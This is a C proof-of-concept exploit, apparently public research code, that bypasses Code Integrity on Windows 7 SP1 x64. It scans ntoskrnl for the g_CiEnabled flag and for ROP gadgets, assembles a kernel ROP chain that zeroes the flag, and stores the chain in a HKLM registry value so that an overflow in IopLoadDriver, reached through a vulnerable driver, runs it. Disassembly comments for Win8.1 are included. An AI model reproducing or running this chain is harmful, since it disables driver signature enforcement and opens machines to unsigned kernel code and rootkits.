//
// Description: Windows 7 SP1 x64 Code Integrity Bypass POC
//
// Author: Volodymyr Pikhur ( volodymyr (dot) pikhur (at) gmail (dot) com )
//
// <<< WARNING >>>: BAD CODE IS BAD AND MAY CAUSE BRAIN DAMAGE :)
//
////////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>
#include <tchar.h>
#include <windows.h>
#include <psapi.h>

// ntoskrnl.exe
// 6.1.7601.18409
//
//PAGE:000000014030E1A0                               SeValidateImageData proc near           ; CODE XREF: MiValidateImagePfn+B0p
//PAGE:000000014030E1A0                                                                       ; MiValidateRelocatedImagePfn+2C1p
//PAGE:000000014030E1A0
//PAGE:000000014030E1A0                              
//PAGE:000000014030E1A0
//PAGE:000000014030E1A0 48 83 EC 28                                   sub     rsp, 28h
//PAGE:000000014030E1A4 33 C0                                         xor     eax, eax
//PAGE:000000014030E1A6 38 05 2C 65 F1 FF                             cmp     cs:g_CiEnabled, al

//
//PAGE:00000001404607E7 48 8B 9C 24 D8 02 00 00                       mov     rbx, [rsp+2C8h+arg_8]
//PAGE:00000001404607EF 48 81 C4 90 02 00 00                          add     rsp, 290h
//PAGE:00000001404607F6 41 5F                                         pop     r15
//PAGE:00000001404607F8 41 5E                                         pop     r14
//PAGE:00000001404607FA 41 5D                                         pop     r13
//PAGE:00000001404607FC 41 5C                                         pop     r12
//PAGE:00000001404607FE 5F                                            pop     rdi
//PAGE:00000001404607FF 5E                                            pop     rsi
//PAGE:0000000140460800 5D                                            pop     rbp
//PAGE:0000000140460801 C3                                            retn
//PAGE:0000000140460801
//PAGE:0000000140460802 90 90 90 90 90 90 90 90 90 90+                align 10h
//PAGE:0000000140460802 90 90 90 90                   IopLoadDriver   endp
//

//
// Win8.1 x64 ntoskrnl.exe 6.3.9600.17085
// 
// nt!IopLoadDriver
//PAGE:00000001404BDA8F 48 8B 9C 24 C8 02 00 00                       mov     rbx, [rsp+280h+arg_8]
//PAGE:00000001404BDA97 48 81 C4 80 02 00 00                          add     rsp, 280h
//PAGE:00000001404BDA9E 41 5F                                         pop     r15
//PAGE:00000001404BDAA0 41 5E                                         pop     r14
//PAGE:00000001404BDAA2 41 5D                                         pop     r13
//PAGE:00000001404BDAA4 41 5C                                         pop     r12
//PAGE:00000001404BDAA6 5F                                            pop     rdi
//PAGE:00000001404BDAA7 5E                                            pop     rsi
//PAGE:00000001404BDAA8 5D                                            pop     rbp
//PAGE:00000001404BDAA9 C3                                            retn
//
//PAGE:000000014039C47C                               SeValidateImageData proc near           
//PAGE:000000014039C47C 4C 8B 15 65 39 F1 FF                          mov     r10, cs:qword_1402AFDE8
//PAGE:000000014039C483 4D 85 D2                                      test    r10, r10
//PAGE:000000014039C486 74 03                                         jz      short loc_14039C48B
//PAGE:000000014039C488 49 FF E2                                      jmp     r10
//PAGE:000000014039C48B                               ; ---------------------------------------------------------------------------
//PAGE:000000014039C48B
//PAGE:000000014039C48B                               loc_14039C48B:                          
//PAGE:000000014039C48B B8 28 04 00 C0                                mov     eax, 0C0000428h
//PAGE:000000014039C490 C3                                            retn
//PAGE:000000014039C490                               SeValidateImageData endp

ULONG g_CiEnabled_Rva;
ULONG64 g_CiEnabled_Address;
ULONG64 g_IopLoadDriverExit_Address;
ULONG64 g_PopRaxRet_Address;
ULONG64 g_MovMemRax0Ret_Address;
ULONG64 g_XorRaxRaxRet_Address;

///
UCHAR g_CiEnabled_Sig[] = { 0x48, 0x83, 0xEC, 0x28, 0x33, 0xC0, 0x38, 0x05 };
///
UCHAR g_IopLoadDriver_Exit[] = { 0x48,0x81,0xC4,0x40,0x02,0x00,0x00,0x41,0x5F,0x41,0x5E,0x41,0x5D,0x41,0x5C,0x5F,0x5E,0x5D,0xC3 };
///
UCHAR g_Pop_Rax_Ret[] = { 0x58, 0xC3 };
///
UCHAR g_MovMemRax_0_Ret[] = { 0xC6, 0x00, 0x00, 0xC3 };
//
UCHAR g_XorRaxRaxRet[] = { 0x33, 0xC0, 0xC3 };

enum ExploitOffset
{
    ExplRetAddress = 26,    
};

ULONG64 ShellCodeRop[37];

#define HKLM_HW_DESC_SYS_KEY "HARDWARE\\DESCRIPTION\\System"

int _tmain(int argc, _TCHAR* argv[])
{
    ULONG SizeNeeded;
    PVOID NTBaseAddress;
    CHAR NTOSName[MAX_PATH];
    
    HMODULE hKrnl = LoadLibraryExA( "ntoskrnl.exe", NULL, 0 );

    if( NULL == hKrnl )
    {
        printf( "unable to load ntoskrnl.exe\n" );
        return 0;
    }
  
    if (!EnumDeviceDrivers(&NTBaseAddress, sizeof(PVOID), &SizeNeeded))
    {
        printf( "EnumDeviceDrivers error: %d", GetLastError() );
        return 0;
    }
 
    if (GetDeviceDriverBaseNameA(NTBaseAddress, NTOSName, sizeof(NTOSName)) == 0)
    {
        printf( "GetDeviceDriverBaseNameA error: %d", GetLastError() );
        return 0;
    }    

    printf("%s found @ %p\n", NTOSName, NTBaseAddress );

    PIMAGE_DOS_HEADER mz = (PIMAGE_DOS_HEADER)hKrnl;

    PIMAGE_NT_HEADERS64 pe = (PIMAGE_NT_HEADERS64)( mz->e_lfanew + (PUCHAR)hKrnl );
    PIMAGE_SECTION_HEADER s = (PIMAGE_SECTION_HEADER)( pe + 1 );
    
    PUCHAR pPageSec = NULL;
    ULONG PageSecSize = 0;

    for (USHORT i = 0; i < pe->FileHeader.NumberOfSections; i++)
    {
        if( 0 == strcmp( (PCHAR)s[i].Name, "PAGE" ) )
        {
            pPageSec = (PUCHAR)hKrnl + s[i].VirtualAddress;
            PageSecSize = s[i].SizeOfRawData;
            break;
        }
    }

    if( 0 == PageSecSize ||
        NULL == pPageSec )
    {
        printf( "unable to locate PAGE section in %s\n", NTOSName ); 
        return 0;
    }

    for( ULONG i = 0; i < PageSecSize - sizeof(g_CiEnabled_Sig); i++ )
    {
        if( 0 == memcmp( &pPageSec[i], g_CiEnabled_Sig, sizeof(g_CiEnabled_Sig) ) )
        {
            LONG g_cie_offset = *(PLONG)&pPageSec[i+sizeof(g_CiEnabled_Sig)];

            g_CiEnabled_Rva = (ULONG)(&pPageSec[i+sizeof(g_CiEnabled_Sig)+4] + g_cie_offset - (PUCHAR)hKrnl);
            g_CiEnabled_Address = (ULONG64)NTBaseAddress + g_CiEnabled_Rva;
            break;
        }
    }

    if( 0 == g_CiEnabled_Rva )
    {
        printf( "unable to find g_CiEnabled\n" ); 
        return 0;
    }
    
    printf( "g_CiEnabled found @ %016I64X\n", g_CiEnabled_Address ); 

    for( ULONG i = 0; i < PageSecSize - sizeof(g_IopLoadDriver_Exit) ; i++ )
    {
        if( 0 == memcmp( &pPageSec[i], g_IopLoadDriver_Exit, sizeof(g_IopLoadDriver_Exit) ) )
        {
            g_IopLoadDriverExit_Address = (ULONG64)(&pPageSec[i] - (PUCHAR)hKrnl) + (ULONG64)NTBaseAddress;
            break;
        }
    }
    

    if( 0 == g_IopLoadDriverExit_Address )
    {
        printf( "unable to find IopLoadDriver\n" ); 
        return 0;
    }

    //
    // pop rax
    // ret
    for( ULONG i = 0; i < PageSecSize - sizeof(g_Pop_Rax_Ret) ; i++ )
    {
        if( 0 == memcmp( &pPageSec[i], g_Pop_Rax_Ret, sizeof(g_Pop_Rax_Ret) ) )
        {
            g_PopRaxRet_Address = (ULONG64)(&pPageSec[i] - (PUCHAR)hKrnl) + (ULONG64)NTBaseAddress;
            break;
        }
    }

    //
    // mov [rax], 0
    // ret
    for( ULONG i = 0; i < PageSecSize - sizeof(g_MovMemRax_0_Ret) ; i++ )
    {
        if( 0 == memcmp( &pPageSec[i], g_MovMemRax_0_Ret, sizeof(g_MovMemRax_0_Ret) ) )
        {
            g_MovMemRax0Ret_Address = (ULONG64)(&pPageSec[i] - (PUCHAR)hKrnl) + (ULONG64)NTBaseAddress;
            break;
        }
    }
    
    // xor eax, eax
    // ret
    for( ULONG i = 0; i < PageSecSize - sizeof(g_XorRaxRaxRet) ; i++ )
    {
        if( 0 == memcmp( &pPageSec[i], g_XorRaxRaxRet, sizeof(g_XorRaxRaxRet) ) )
        {
            g_XorRaxRaxRet_Address = (ULONG64)(&pPageSec[i] - (PUCHAR)hKrnl) + (ULONG64)NTBaseAddress;
            break;
        }
    }


    if( 0 == g_PopRaxRet_Address ||
        0 == g_MovMemRax0Ret_Address )
    {
        printf( "unable to generate ROP chain\n" );
        return 0;
    }
  
    //
    // NT Kernel ROP chain to bypass Code Integrity on Windows 7 x64 SP1 from IopLoadDriver
    //
    // ntoskrnl.exe
    // 6.1.7601.18409  
    //
    // pop           rax                  ; rsp + 10  ; skip this gets replaced by IopLoadDriver after overflow
    // pop           rax                  ; rsp + 20  ; nt!g_CiEnabled
    // mov byte ptr [rax], 0              ; rsp + 28  ; nt!g_CiEnabled = 0
    // pop           rax                  ; rsp + 38  ; align stack     
    // pop           rax                  ; rsp + 48  ; align stack
    // xor           eax, eax             ; rsp + 50  ; STATUS_SUCCESS
    // add           rsp, 240h            ; rsp + 290 ; epilogue
    // pop           r15
    // pop           r14
    // pop           r13
    // pop           r12
    // pop           rdi
    // pop           rsi
    // pop           rbp
    // retn                               ; return to IopLoadUnloadDriver
    ////////////////////////////////////////////////////////////////


    int RetPtrIdx = ExplRetAddress;

    // this get's replaced so just pop it from stack and ignore
    ShellCodeRop[RetPtrIdx+0] = g_PopRaxRet_Address;
    ShellCodeRop[RetPtrIdx+1] = g_CiEnabled_Address;
    
    // get g_CiEnabled address from stack
    ShellCodeRop[RetPtrIdx+2] = g_PopRaxRet_Address;
    ShellCodeRop[RetPtrIdx+3] = g_CiEnabled_Address;
    
    // patch g_CiEnabled ( mov b,[rax],0 )
    ShellCodeRop[RetPtrIdx+4] = g_MovMemRax0Ret_Address;
    
    // stack alignment
    ShellCodeRop[RetPtrIdx+5] = g_PopRaxRet_Address;    
    ShellCodeRop[RetPtrIdx+6] = 0;
    ShellCodeRop[RetPtrIdx+7] = g_PopRaxRet_Address;
    ShellCodeRop[RetPtrIdx+8] = 0;
    
    // return STATUS_SUCCESS
    ShellCodeRop[RetPtrIdx+9] = g_XorRaxRaxRet_Address;    
    
    // execute epilogue to properly exit from IopLoadDriver    
    ShellCodeRop[RetPtrIdx+10] = g_IopLoadDriverExit_Address;

    LSTATUS ls = RegSetKeyValueA( HKEY_LOCAL_MACHINE, HKLM_HW_DESC_SYS_KEY, "Identifier", REG_BINARY, (PVOID)&ShellCodeRop[0], sizeof(ShellCodeRop) );

    if( ERROR_SUCCESS != ls )
    {
        printf( "unable to write ROP to registry, error: %d\n", ls );

        return 0;
    }


    printf( "ROP was written to reigsty now load vulnerable driver.\n" );

    return 0;
}
